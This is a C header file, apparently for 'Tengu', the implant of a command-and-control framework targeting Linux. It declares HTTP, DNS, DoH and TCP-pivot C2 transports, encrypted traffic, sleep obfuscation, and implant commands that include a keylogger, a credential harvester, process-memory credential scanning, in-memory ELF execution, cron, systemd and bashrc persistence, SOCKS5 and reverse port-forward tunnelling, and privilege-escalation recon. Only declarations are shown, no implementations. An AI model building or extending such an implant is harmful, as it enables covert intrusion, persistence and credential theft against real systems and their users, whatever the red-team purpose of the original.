#ifndef TENGU_H
#define TENGU_H

#include <stdint.h>
#include <stddef.h>

// Protocol constants
#define TENGU_MAGIC_VALUE   0x54454E47u  // "TENG"
#define DEMON_INIT          99u
#define COMMAND_GET_JOB     1u
#define COMMAND_NOJOB       10u
#define COMMAND_SLEEP       11u
#define COMMAND_OUTPUT      90u
#define COMMAND_ERROR       91u
#define COMMAND_EXIT        92u
#define TENGU_SHELL         0x300u
#define TENGU_PWD           0x301u
#define TENGU_LS            0x302u
#define TENGU_CD            0x303u
#define TENGU_DOWNLOAD      0x304u
#define TENGU_UPLOAD        0x305u
#define TENGU_CAT           0x306u
#define TENGU_MKDIR         0x307u
#define TENGU_RM            0x308u
#define TENGU_PS            0x309u
#define TENGU_ID            0x30Au
#define TENGU_ENV           0x30Bu
#define TENGU_IFCONFIG      0x30Cu
#define TENGU_CHMOD         0x30Du
#define TENGU_CP            0x30Eu
#define TENGU_KILL          0x30Fu
#define TENGU_SOCKS5_OPEN   0x310u
#define TENGU_SOCKS5_DATA   0x311u
#define TENGU_SOCKS5_CLOSE  0x312u
#define TENGU_BOF           0x313u
#define TENGU_LS_UI         0x314u
#define TENGU_PS_UI         0x315u
#define TENGU_NETSTAT       0x316u
#define TENGU_ARP           0x317u
#define TENGU_ROUTE         0x318u
#define TENGU_PERSIST_CRON  0x319u
#define TENGU_PERSIST_SYS   0x31Au
#define TENGU_PERSIST_BASH  0x31Bu
#define TENGU_SCREENSHOT    0x31Cu
#define TENGU_WHOAMI        0x31Du
#define TENGU_KEYLOG        0x31Eu
#define TENGU_HARVEST       0x31Fu
#define TENGU_MEMFD         0x320u
#define TENGU_PORTSCAN        0x321u
#define TENGU_PROCDUMP        0x322u
#define TENGU_RPORTFWD_OPEN   0x323u
#define TENGU_RPORTFWD_DATA   0x324u
#define TENGU_RPORTFWD_CLOSE  0x325u
#define TENGU_PRIVESC           0x326u
// TCP pivot server (parent side)
#define TENGU_PIVOT_TCP_LISTEN  0x330u  // TS->parent: start listening on port
#define TENGU_PIVOT_TCP_DATA    0x331u  // bidirectional: child frame relay
#define TENGU_PIVOT_TCP_DISCONN 0x332u  // parent->TS: child disconnected

// Config structure populated from CONFIG_BYTES at compile time.
typedef struct {
    int      sleep_delay;
    int      sleep_jitter;
    int      transport;    // 0=HTTP 1=DNS 2=DoH 3=TCP pivot
    // HTTP transport
    char*    host;
    int      port;
    char**   uris;
    int      uri_count;
    int      secure;
    char*    user_agent;
    char**   http_headers;
    int      http_header_count;
    // DNS / DoH transport
    char*    dns_host;
    int      dns_port;
    char*    dns_domain;
    char*    doh_path;
    int      doh_secure;
    // TCP pivot transport
    char*    pivot_host;
    int      pivot_port;
    // Proxy support (NULL = rely on HTTP_PROXY/HTTPS_PROXY env vars)
    char*    proxy_host;
    int      proxy_port;
    int      proxy_type;   // 0=HTTP 1=SOCKS5
    char*    proxy_user;   // NULL = no auth
    char*    proxy_pass;
    // Operational constraints
    int64_t  kill_date;      // Unix timestamp; 0 = disabled
    int32_t  working_hours;  // bit-packed: [22]=enabled [21:17]=StartHour [16:11]=StartMin [10:6]=EndHour [5:0]=EndMin
} TenguConfig;

// Packet buffer (dynamic)
typedef struct {
    uint8_t* data;
    size_t   size;
    size_t   cap;
} Buf;

// Global agent state
extern uint32_t    g_agent_id;
extern TenguConfig g_config;

// ChaCha20 application-layer encryption
extern uint8_t g_chacha_key[32]; // session key, generated at startup
extern int     g_chacha_ready;   // 1 after INIT succeeds

// Encrypt/decrypt buf in-place: RFC 8439 ChaCha20, key=32B, nonce=12B.
void chacha20_xcrypt(const uint8_t key[32], const uint8_t nonce[12],
                     uint32_t counter, uint8_t* buf, size_t len);
// Fill out with len random bytes from /dev/urandom.
void tengu_getrandom(uint8_t* out, size_t len);

// Config parsing
void config_parse(const uint8_t* bytes, size_t len);

// C2 transport function pointer type
typedef int (*c2_post_fn)(const uint8_t* body, size_t body_len,
                           uint8_t** resp_out, size_t* resp_len_out);
extern c2_post_fn g_c2_post;

// HTTP
int http_post(const char* host, int port, const char* uri, int secure,
              const uint8_t* body, size_t body_len,
              uint8_t** resp_out, size_t* resp_len_out);
int http_c2_post(const uint8_t* body, size_t body_len,
                 uint8_t** resp_out, size_t* resp_len_out);

// DNS / DoH transport
int dns_c2_post(const uint8_t* body, size_t body_len,
                uint8_t** resp_out, size_t* resp_len_out);
int doh_c2_post(const uint8_t* body, size_t body_len,
                uint8_t** resp_out, size_t* resp_len_out);

// TCP pivot transport (child connects to parent Demon)
int tcp_c2_post(const uint8_t* body, size_t body_len,
                      uint8_t** resp_out, size_t* resp_len_out);

// Buffer helpers
Buf* buf_new(void);
void buf_push_u32be(Buf* b, uint32_t v);
void buf_push_u32le(Buf* b, uint32_t v);
void buf_push_bytes(Buf* b, const uint8_t* data, size_t len);
void buf_push_str_be(Buf* b, const char* str);  // [len:4B BE][str]
void buf_free(Buf* b);

// Parser (reads LE, matches server BuildTenguMessage output)
typedef struct {
    const uint8_t* data;
    size_t         pos;
    size_t         len;
} Parser;

Parser parser_new(const uint8_t* data, size_t len);
uint32_t parser_u32le(Parser* p);
char*    parser_str(Parser* p);    // returns malloc'd string, caller frees
uint8_t* parser_bytes(Parser* p, size_t* out_len);

// Commands - base
void cmd_shell(uint32_t req_id, const char* cmdstr);
void cmd_sleep(uint32_t req_id, int delay, int jitter);
void cmd_exit(uint32_t req_id);
void cmd_pwd(uint32_t req_id);
void cmd_ls(uint32_t req_id, const char* path);
void cmd_ls_json(uint32_t req_id, const char* path);
void cmd_ps_json(uint32_t req_id);
void cmd_cd(uint32_t req_id, const char* path);
void cmd_download(uint32_t req_id, const char* path);
// Commands - extended
void cmd_upload(uint32_t req_id, const char* remote_path, const uint8_t* data, size_t data_len);
void cmd_cat(uint32_t req_id, const char* path);
void cmd_mkdir(uint32_t req_id, const char* path);
void cmd_rm(uint32_t req_id, const char* path, int recursive);
void cmd_ps(uint32_t req_id);
void cmd_id(uint32_t req_id);
void cmd_env(uint32_t req_id);
void cmd_ifconfig(uint32_t req_id);
void cmd_chmod(uint32_t req_id, const char* path, uint32_t mode);
void cmd_cp(uint32_t req_id, const char* src, const char* dst);
void cmd_kill(uint32_t req_id, uint32_t pid);
// Commands - network recon
void cmd_netstat(uint32_t req_id);
void cmd_arp(uint32_t req_id);
void cmd_route(uint32_t req_id);

// Commands - persistence
void cmd_persist_cron(uint32_t req_id, const char* payload_path, const char* interval);
void cmd_persist_systemd(uint32_t req_id, const char* payload_path);
void cmd_persist_bash(uint32_t req_id, const char* payload_path);

// Commands - screenshot
void cmd_screenshot(uint32_t req_id);

// Commands - identity
void cmd_whoami(uint32_t req_id, int all_flag);

// Commands - keylogger
void cmd_keylog(uint32_t req_id, int duration_secs);

// Commands - credential harvester
void cmd_harvest(uint32_t req_id);

// Commands - in-memory ELF execution
void cmd_memfd(uint32_t req_id, const uint8_t* elf_data, size_t elf_len, const char* args);

// Commands - port scanner
void cmd_portscan(uint32_t req_id, const char* target, const char* ports_str, int timeout_ms);

// Commands - process memory credential scan
// pid <= 0 means scan all accessible processes
void cmd_procdump(uint32_t req_id, int pid);

// Commands - ELF BOF loader
void cmd_bof(uint32_t req_id, const uint8_t* elf_data, size_t elf_len, char* args, int args_len);

// Commands - SOCKS5 tunneling
void socks5_init(void);
void socks5_open(uint32_t conn_id, const char* host, uint16_t port);
void socks5_send_data(uint32_t conn_id, const uint8_t* data, size_t dlen);
void socks5_close(uint32_t conn_id);
void socks5_collect_data(void);
int  socks5_active(void);

// Commands - reverse port forward
void rportfwd_init(void);
void rportfwd_open(uint32_t conn_id, const char* host, uint16_t port);
void rportfwd_send_data(uint32_t conn_id, const uint8_t* data, size_t dlen);
void rportfwd_close(uint32_t conn_id);
void rportfwd_collect_data(void);
int  rportfwd_active(void);

// Commands - privilege escalation recon
void cmd_privesc(uint32_t req_id);

// Sleep obfuscation: XOR-encrypts agent code during sleep.
void sleep_obf(unsigned int secs);

// TCP pivot server (parent Tengu listens for child Tengu connections)
void     pivot_server_init(void);
int      pivot_server_listen(int port);
void     pivot_server_write(uint32_t child_id, const uint8_t* data, size_t len);
void     pivot_server_disconnect(uint32_t child_id);
int      pivot_server_active(void);
// Returns TS response bytes (caller must free), or NULL if nothing to do.
uint8_t* pivot_server_collect_ex(size_t* resp_len_out);

// Network packet builders
Buf* build_init_packet(void);
Buf* build_checkin_packet(void);
Buf* build_output_packet(uint32_t req_id, uint32_t cmd, const char* output);
Buf* build_download_result(uint32_t req_id, const char* path, const uint8_t* data, size_t len);

#endif // TENGU_H
